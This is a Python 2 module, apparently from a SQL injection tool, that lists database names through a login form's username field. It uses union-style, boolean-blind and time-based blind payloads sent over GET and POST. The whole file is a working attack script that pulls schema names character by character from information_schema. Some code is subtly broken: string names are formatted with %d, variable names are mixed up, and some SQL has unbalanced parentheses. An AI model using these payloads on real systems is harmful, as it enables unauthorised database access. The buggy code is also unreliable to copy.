#!/usr/bin/env python
# -*- coding:utf-8 -*-
from config import UnpackFunction
from lib.log import logger
from test import SqliTest

__author__ = "LoRexxar"

# 居然忘记了database也要注...


class SqliDatabases(SqliTest):
    def __init__(self):
        SqliTest.__init__(self)
        SqliTest.test(self, output=0)
        self.databases_name = []

    def get_database(self):

        databases_name = ""

        if self.sqlirequest == "GET":
            logger.info("The sqlirequest is %s, start sqli databases..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                # 先注databases的数量
                payload = "username=admi' or SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA  limit 0,1%23&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                databases_number = int(UnpackFunction(r))
                logger.info("Databases account sqli success...The databases_number is %d..." % databases_number)
                print "[*] databases_number: %d" % databases_number

                # 每个循环跑一次databases的数据
                for i in range(0, int(databases_number)):
                    # 首先是database name的长度
                    payload = "username=a' or SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                        i) + ",1%23&passwd=ddog123&submit=Log+In"
                    r = self.Data.GetData(payload)
                    databases_name_len = int(UnpackFunction(r))
                    logger.info("Databases name length sqli success...The databases_name_len is %d..." % databases_name_len)
                    print "[*] databases_name_len: %d" % databases_name_len

                    # 然后注database name
                    payload = "username=ad' or SELECT SCHEMA_NAME from information_schema.SCHEMATA limit " + repr(
                        i) + ",1)%23&passwd=ddog123&submit=Log+In"
                    r = self.Data.GetData(payload)
                    databases_name = UnpackFunction(r)
                    logger.info("Tables name sqli success...The databases_name is %d..." % databases_name)

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)
                    print "[*] databases_name: %s" % databases_name

            elif self.sqlimethod == "build":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                for i in range(0, 100):
                    # 先注databases的数量
                    payload = "username=admi' or SElECT ((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
                        i) + ")%23&passwd=ddog123&submit=Log+In"
                    if self.Data.GetBuildData(payload, self.len) == 0:
                        databases_number = i
                        break

                logger.info("Databases amount sqli success...The databases_number is %d..." % databases_number)
                print "[*] databases_number: %d" % databases_number

                for i in range(0, int(databases_number)):
                    # 然后注databases_name 的 length
                    for j in range(0, 30):
                        payload = "username=admi' or select ((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA WHERE table_schema = " + self.database + " limit " + repr(
                            i) + ",1) > " + repr(j) + ")%23&passwd=ddog123&submit=Log+In"
                        if self.Data.GetBuildData(payload, self.len) == 0:
                            databases_name_len = j
                            break

                    logger.info("Databases name length sqli success...The databases_name_len is %d..." % databases_name_len)
                    print "[*] databases_name_len: %d" % databases_name_len

                    # 然后注databases名字
                    for j in range(0, int(databases_name_len)):
                        for k in range(30, 130):
                            payload = "username=admi' or select (SELECT ascii(substring(SCHEMA_NAME," + repr(
                                j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
                                i) + ",1) >" + repr(k) + "))%23&passwd=ddog123&submit=Log+In"
                            if self.Data.GetBuildData(payload, self.len) == 0:
                                databases_name += chr(int(k))
                                break

                    logger.info("Databases name sqli success...The databases_name is %d..." % databases_name)

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)
                    print "[*] databases_name:" + databases_name

            elif self.sqlimethod == "time":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                for i in range(0, 100):

                    # 先注databases的数量
                    payload = "username=admi' or SELECT if((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
                        i) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
                    if self.Data.GetTimeData(payload, self.time) == 0:
                        databases_number = i
                        break

                logger.info("Databases amount sqli success...The databases_number is %d..." % databases_number)
                print "[*] databases_number: %d" % databases_number

                for i in range(0, int(databases_number)):
                    # 然后注databases_number 的length
                    for j in range(0, 30):
                        payload = "username=admi' or SELECT if((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                            i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"

                        if self.Data.GetTimeData(payload, self.time) == 0:
                            databases_name_len = j
                            break

                    logger.info("Databases name length sqli success...The databases_name_len is %d..." % databases_name_len)
                    print "[*] databases_name_len: %d" % databases_name_len

                    # 然后注databases名字
                    for j in range(0, int(databases_name_len)):
                        for k in range(30, 130):
                            payload = "username=admi' or SELECT if((SELECT  ascii(substring(SCHEMA_NAME," + repr(
                                j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
                                i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"

                            if self.Data.GetTimeData(payload, self.time) == 0:
                                databases_name += chr(int(k))
                                break

                    logger.info("Databases name sqli success...The databases_name is %d..." % databases_name)

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)
                    print "[*] databases_name:" + databases_name

        # 然后是post
        elif self.sqlirequest == "POST":
            logger.info("The sqlirequest is %s, start sqli databases..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                # 先注databases的数量
                payload = {
                    "username": "admi' or SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1%23",
                    "passwd": "ddog123"}
                r = self.Data.PostData(payload)
                databases_number = int(UnpackFunction(r))
                logger.info("Databases account sqli success...The databases_number is %d..." % databases_number)
                print "[*] databases_number: %d" % databases_number

                # 每个循环跑一次databases的数据
                for i in range(0, int(databases_number)):
                    # 首先是database name的长度
                    payload = {
                        "username": "a' or SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                            i) + ",1%23", "passwd": "ddog123&submit=Log+In"}
                    r = self.Data.PostData(payload)
                    databases_name_len = int(UnpackFunction(r))
                    logger.info("Databases name length sqli success...The databases_name_len is %d..." % databases_name_len)
                    print "[*] databases_name_len: %d" % databases_name_len

                    # 然后注database name
                    payload = {
                        "username": "ad' or SELECT SCHEMA_NAME from information_schema.SCHEMATA limit " + repr(
                            i) + ",1)%23", "passwd": "ddog123"}
                    r = self.Data.PostData(payload)
                    database_name = UnpackFunction(r)
                    logger.info("Databases name sqli success...The database_name is %d..." % database_name)

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)
                    print "[*] database_name: %s" % database_name

            elif self.sqlimethod == "build":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                for i in range(0, 100):
                    # 先注databases的数量
                    payload = {
                        "username": "admi' or SElECT ((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
                            i) + ")%23", "passwd": "ddog123"}
                    if self.Data.PostBuildData(payload, self.len) == 0:
                        databases_number = i
                        break

                logger.info("Databases amount sqli success...The databases_number is %d..." % databases_number)
                print "[*] databases_number: %d" % databases_number

                for i in range(0, int(databases_number)):
                    # 然后注databases_name 的 length
                    for j in range(0, 30):
                        payload = {
                            "username": "admi' or select ((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                                i) + ",1) > " + repr(j) + ")%23", "passwd": "ddog123"}
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            databases_name_len = j
                            break

                    logger.info("Databases name length sqli success...The databases_name_len is %d..." % databases_name_len)
                    print "[*] databases_name_len: %d" % databases_name_len

                    # 然后注databases名字
                    for j in range(0, int(databases_name_len)):
                        for k in range(30, 130):
                            payload = {"username": "admi' or select (SELECT ascii(substring(SCHEMA_NAME," + repr(
                                j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
                                i) + ",1) >" + repr(k) + "))%23", "passwd": "ddog123"}
                            if self.Data.PostBuildData(payload, self.len) == 0:
                                databases_name += chr(int(k))
                                break

                    logger.info("Databases name sqli success...The databases_name is %d..." % databases_name)

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)
                    print "[*] databases_name:" + databases_name

            elif self.sqlimethod == "time":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                for i in range(0, 100):

                    # 先注databases的数量
                    payload = {
                        "username": "admi' or SELECT if((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
                            i) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}
                    if self.Data.PostTimeData(payload, self.time) == 0:
                        databases_number = i
                        break

                logger.info("Databases amount sqli success...The databases_number is %d..." % databases_number)
                print "[*] databases_number: %d" % databases_number

                for i in range(0, int(databases_number)):
                    # 然后注databases_number 的length
                    for j in range(0, 30):
                        payload = {
                            "username": "admi' or SELECT if((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                                i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}

                        if self.Data.PostTimeData(payload, self.time) == 0:
                            databases_name_len = j
                            break

                    logger.info("Databases name length sqli success...The databases_name_len is %d..." % databases_name_len)
                    print "[*] databases_name_len: %d" % databases_name_len

                    # 然后注databases名字
                    for j in range(0, int(databases_name_len)):
                        for k in range(30, 130):
                            payload = {"username": "admi' or SELECT if((SELECT  ascii(substring(SCHEMA_NAME," + repr(
                                j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
                                i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}

                            if self.Data.PostTimeData(payload, self.time) == 0:
                                databases_name += chr(int(k))
                                break

                    logger.info("Databases name sqli success...The databases_name is %d..." % databases_name)

                    # 把databases_name 中不是information_schema插入列表
                    if databases_name != "information_schema":
                        self.databases_name.append(databases_name)
                    print "[*] databases_name:" + databases_name
